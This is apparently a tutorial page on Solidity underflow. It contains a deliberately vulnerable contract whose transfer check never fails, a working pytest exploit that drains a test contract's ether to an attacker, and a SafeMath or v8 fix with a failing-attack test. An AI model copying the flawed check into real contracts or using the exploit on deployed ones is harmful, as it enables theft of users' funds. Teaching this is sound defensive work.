---
sidebar_position: 3
tags: [underflow, solidity, attack]
---

# Underflow

:::caution DEPRECATED

This exploit is reproducible only in Solidity **version 7** and below. Since the release of the version **8**, the overflow code causes `VirtualMachineError` by default.

:::

### Description

An arithmetic underflow very similar to the [overflow](./overflow.md) problem. However, here the exploit would attempt to convert zero into a positive integer and thus allow us to execute the logic of the contract we would not be allowed otherwise.

Consider the following smart contract:


```solidity title=/contracts/underflow/EtherStoreUnderflow.sol sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/contracts/underflow/EtherStoreUnderflow.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "@openzeppelinV7/contracts/utils/ReentrancyGuard.sol";

contract EtherStoreUnderflow is ReentrancyGuard {
    mapping(address => uint256) public balances;

    ...

    function withdraw() public nonReentrant {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");

        require(sent, "Transfer failed.");

        balances[msg.sender] = 0;
    }

    function transfer(address _to, uint256 _value)
        public
        nonReentrant
        returns (bool)
    {
        // highlight-next-line
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    ...
```

To perform this attack, we assume that the contract's balance is not 0. Some users have deposited ETH. Then two new users come into the play. Let's say an attacker and his friend. Both have 0 balance on this contract. However, not for long. The line of the attacker's interest is 29. The underflow of the `uint256` variable will result in a positive number if we perform a simple arithmetic operation with the `_value` of the contract balance minus 1, for instance.


### How to test

Let's consider the following unit test executing the attack:

```python title=/tests/underflow/test_ether_store_underflow.py sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/tests/underflow/test_ether_store_underflow.py#L22

import pytest
from brownie import exceptions
from scripts.utils import (
    get_attacker_account,
    get_default_account,
    get_user_account,
)
from scripts.underflow.deploy_and_attack import deploy_contract, deploy_fixed_contract
from web3 import Web3



def test_ether_store_underflow_successful_attack():
    store_contract = deploy_contract()

    # 1.Deposit some funds to the contract
    deposit_tx = store_contract.deposit(
        {"from": get_default_account(), "value": Web3.toWei(30, "ether")}
    )

    deposit_tx.wait(1)

    # 2. Prepare users to perform the attack, and fixate their balances before the execution
    attacker = get_attacker_account()
    attackers_friend = get_user_account()
    attacker_balance = attacker.balance() / 10**18
    attackers_friend_balance = attackers_friend.balance() / 10**18
    store_balance = store_contract.balanceOf() / 10**18

    print(f"Store balance: {store_balance} ETH")

    # 3. Lets withdraw everything - 1, for example
    WITHDRAW_AMOUNT = store_balance - 1

    # 4. Call transfer function of the contract to shuffle the funds to the attacker's account
    transfer_tx = store_contract.transfer(
        attacker.address,
        Web3.toWei(WITHDRAW_AMOUNT, "ether"),
        {"from": attackers_friend},
    )
    transfer_tx.wait(1)

    assert store_contract.user_balanceOf(attacker.address) == Web3.toWei(
        WITHDRAW_AMOUNT, "ether"
    )

    # 5. Withdraw funds from the contract to the attacker account
    withdraw_tx = store_contract.withdraw({"from": attacker})
    withdraw_tx.wait(1)

    assert store_contract.balanceOf() / 10**18 == 1
    # highlight-next-line
    assert attacker.balance() / 10**18 == attacker_balance + WITHDRAW_AMOUNT
    assert attackers_friend.balance() / 10**18 == attackers_friend_balance

    ...

```
The test asserts the attackers balance on line 53, confirming a successful transfer of the `WITHDRAW_AMOUNT`.


### How to fix

If you would use solidity prior v8, it's necessary to use safe math libraries to fix this problem. One of the examples is the [SafeMath](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/math/SafeMath.sol) from OpenZeppelin. The best option is to upgrade Solidity to v8.


### Demo


I [chose](https://github.com/kkateq/solidity-hacks/blob/main/contracts/underflow/EtherStoreUnderflowFixed.sol) upgrading Solidity version to fix the problem. Additionally, this points again that using the latest available solidity version is the safest option to go.

Check out the unit test that now fails to exploit the contract:

```python title=/tests/underflow/test_ether_store_underflow.py sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/tests/underflow/test_ether_store_underflow.py#L22

   ...

def test_ether_store_underflow_fixed_failed_attack():
    store_contract = deploy_fixed_contract()

    # 1.Deposit some funds
    deposit_tx = store_contract.deposit(
        {"from": get_default_account(), "value": Web3.toWei(30, "ether")}
    )

    deposit_tx.wait(1)

    attacker = get_attacker_account()
    attackers_friend = get_user_account()
    attacker_balance = attacker.balance() / 10**18
    attackers_friend_balance = attackers_friend.balance() / 10**18
    store_balance = store_contract.balanceOf() / 10**18
    print(f"Store balance: {store_balance} ETH")

    # Lets withdraw everything - 1, for example
    WITHDRAW_AMOUNT = store_balance - 1

    # 2. Call transfer function of the contract to shuffle the funds to the attacker's account
    #  highlight-next-line
    with pytest.raises(exceptions.VirtualMachineError):
        transfer_tx = store_contract.transfer(
            attacker.address,
            Web3.toWei(WITHDRAW_AMOUNT, "ether"),
            {"from": attackers_friend},
        )
        transfer_tx.wait(1)

    assert store_contract.user_balanceOf(attacker.address) == 0
    assert store_contract.balanceOf() / 10**18 == store_balance
    assert attacker.balance() / 10**18 == attacker_balance
    assert attackers_friend.balance() / 10**18 == attackers_friend_balance

    ...

```

So the test above shows that a transfer attempt would raise an exception which would be the expected behavior.

**Thank you for reading and good luck with building secure blockchain!**
